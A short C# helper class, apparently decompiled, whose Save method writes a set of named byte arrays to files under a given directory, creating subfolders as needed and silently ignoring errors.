using System.IO;

namespace Server.Helper;

internal class DynamicFiles
{
	public static void Save(string path, object[] Dynamicfls)
	{
		int num = 0;
		while (num < Dynamicfls.Length)
		{
			object[] array = (object[])Dynamicfls[num++];
			try
			{
				string path2 = Path.Combine(path, (string)array[0]);
				byte[] bytes = (byte[])array[1];
				string directoryName = Path.GetDirectoryName(path2);
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
				}
				File.WriteAllBytes(path2, bytes);
			}
			catch
			{
			}
		}
	}
}
